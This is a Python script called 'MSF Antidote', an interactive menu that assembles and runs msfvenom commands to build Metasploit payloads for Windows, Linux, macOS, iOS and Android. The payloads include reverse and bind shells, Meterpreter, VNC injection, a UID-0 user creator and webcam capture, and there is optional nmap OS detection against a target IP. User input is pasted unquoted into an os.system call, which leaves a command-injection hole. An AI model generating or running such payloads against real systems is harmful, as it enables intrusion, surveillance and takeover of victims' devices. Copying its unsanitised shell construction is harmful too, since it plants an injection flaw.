#!/usr/bin/env python3

import sys, os, subprocess




#Color Variables

black = '\u001b[30m'
red = '\u001b[31m'
green = '\u001b[32m'
yellow = '\u001b[33m'
blue = '\u001b[34m'
magenta = '\u001b[35m'
cyan = '\u001b[36m'
normal = '\u001b[37m'
normal = '\u001b[00m'

black_b = '\u001b[40m'
red_b = '\u001b[41m'
green_b = '\u001b[42m'
yellow_b = '\u001b[43m'
blue_b = '\u001b[44m'
magenta_b = '\u001b[45m'
cyan_b = '\u001b[46m'
white_b = '\u001b[47m'


def main():

    #Command Variables
    plat_str = ''
    arch_str =''
    ip = ''
    port = ''
    stage = ''
    LHOST = ''
    LPORT = ''
    RHOST = ''
    RPORT = ''
    form = ''
    payload = ''
    output = ''
    plat_cmd = ''
    arch_cmd = ''
    pexec_cmd = ''

    #OS Detection
    detect_input = input(f'{normal}\nWelcome to MSF Antidote.  Would you like to enable OS detection? {red}[Requires Nmap] {cyan}(y/n){normal}  ')

    if detect_input.lower() == 'y':
        ip_input = input('\nPlease enter the target IP: ')
        command = ['sudo', 'nmap', '-O', f'{ip_input}']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        text = p.stdout.readlines()
        retcode = p.wait()

    #Platform Selection
    elif detect_input.lower() == 'n':
        platform_input = input(f'\n{normal}Select your target platform:\n\n{normal}1) {cyan}Windows\n\n{normal}2) {cyan}Linux\n\n{normal}3) {cyan}OSX\n\n{normal}4) {cyan}Apple ios\n\n{normal}5) {cyan}Android\n\n{normal}')
        os.system('clear')



    ### WINDOWS-----------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '1':
            plat_str = 'msfvenom -p windows/' 
            plat_cmd = '--platform windows'
            form = '-f exe'            
            
        #Windows Architecture Input
            architecture_input = input(f'\n{normal}Select Platform Architecture:\n\n{normal}1) {cyan}x86\n\n{normal}2) {cyan}x64{normal}')
            os.system('clear')
            if architecture_input == '1':
                arch_cmd = '-a x86'

        #Windows x86 Payload Input
                payload_input = input(f'{normal}Select from available payloads:\n\n{normal}1) {cyan}Spawn a piped command shell\n\n{normal}2) {cyan}Upload an executable and run it\n\n{normal}')
                os.system('clear')

                if payload_input == '1':
                    payload = 'shell_reverse_tcp'
                    
                    port_input = input(f'\n{normal}Enter Listening Port: \n\n{normal}')
                    LPORT = f'LPORT={port_input}'   
                    
                    os.system('clear')

                elif payload_input == '2':
                    payload = 'upexec/bind_tcp'
                    
                    port_input = input(f'\n{normal}Enter Listening Port: \n\n{normal}')
                    LPORT = f'LPORT={port_input}'
                    os.system('clear') 
                    
                    pexec_input = input(f'\n{normal}Enter the path to the file you wish to upload and execute.\n\n{normal}')
                    pexec_cmd = f'PEXEC={pexec_input}'
                    os.system('clear')


        #Windows x64 Payload Input
            elif architecture_input == '2':
                arch_str = 'x64/'
                arch_cmd = 'x64'

        #Windows x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Listen for a connection and spawn a command shell\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a VNC Dll via a reflective loader\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'shell_bind_tcp'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'
                elif payload_input == '3':
                    payload = 'vncinject/bind_tcp '   



    ### LINUX-------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '2':
            plat_str = 'msfvenom -p linux/' 
            plat_cmd = '--platform linux'  
            form = '-f elf'                           
    
        #Linux Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
            os.system('clear')
            if architecture_input == '1':
                arch_str = 'x86/'
                arch_cmd = '-a x86'

        #Linux x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Create a new user with UID 0\n\n2) Execute an arbitrary command or just a /bin/sh shell\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'adduser'
                elif payload_input == '2':
                    payload = 'exec'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp'

        #Linux x64 Payload Input
            elif architecture_input == '2':
                arch_str = 'x64/'
                arch_cmd = '-a x64'

        #Linux x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command or just a /bin/sh shell\n\n2) Accept a connection from attacker and report UUID\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'exec'
                elif payload_input == '2':
                    payload = 'pingback_bind_tcp'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp'



    ### OSX-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '3':
            plat_str = 'msfvenom -p osx/' 
            plat_cmd = '--platform osx'
            form = '-f macho'            
            
        #OSX Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
            os.system('clear')
            if architecture_input == '1':
                arch_str = 'x86/'
                arch_cmd = '-a x86'

        #OSX x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a Mach-O bundle to capture a photo from the iSight\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'exec'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'
                elif payload_input == '3':
                    payload = 'isight/reverse_tcp'

        #OSX x64 Payload Input
            elif architecture_input == '2':
                arch_str = 'x64/'
                arch_cmd = '-a x64'

        #OSX x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Say an arbitrary string outloud using Mac OS X text2speech\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'exec '
                elif payload_input == '2':
                    payload = 'say'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp '                    



    ### Apple ios-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '4':
            plat_str = 'msfvenom -p apple_ios/' 
            plat_cmd = '--platform apple_ios'
            form = '-f macho'
            
        #Apple ios Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) aarch64\n\n2) armle')
            os.system('clear')
            if architecture_input == '1':
                arch_str = 'aarch64/'
                arch_cmd = '-a aarch64'

        #Apple ios x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n2) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'meterpreter_reverse_http'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'

        #Apple ios x64 Payload Input
            elif architecture_input == '2':
                arch_str = 'armle/'
                arch_cmd = '-a armle'

        #Apple ios x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'meterpreter_reverse_tcp'                                  



    ### ANDROID-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '5':
            plat_str = 'msfvenom -p android/'   
            plat_cmd = '--platform android'
            arch_cmd = '-a dalvik'
        
        #Android Payload Input
            payload_input = input('Select from available payloads:\n\n1) Run a meterpreter server in Android. Connect back stager\n\n2) Spawn a piped command shell (sh). Connect back stager\n\n')
            os.system('clear')  

            if payload_input == '1':
                    payload = 'meterpreter/reverse_tcp'
            elif payload_input == '2':
                    payload = 'shell/reverse_tcp '



    #Port and IP Input
    ip_input = input('\nEnter Local IP: \n\n')
    LHOST = f'LHOST={ip_input}'
    os.system('clear')

    # port_input = input('\nEnter Target Port: \n\n')
    # LPORT = f'LPORT={port_input}'   
    # os.system('clear')




    #File Output
    output = input(f'\n{normal}Please Name Your File: {normal}')
    output = f'> {output}'
    os.system('clear')

    #Final Command       
    cmd = f'{plat_str}{arch_str}{payload} {plat_cmd} {arch_cmd} {LHOST} {RHOST} {LPORT} {RPORT} {form} {pexec_cmd} {output}'

    os.system(cmd)
    print(cmd)

    #Repeat or exit
    repeat = input(f'\n\n{normal}Would you like to create another payload?  {cyan}(y/n): \n\n{normal}')
    if repeat.lower() == "y":
        main()
    else:
        print(f'\n{red}Good Bye{normal}')
        exit()
  
  
  ### DUNDER CHECK ###
if __name__ == "__main__":
  main()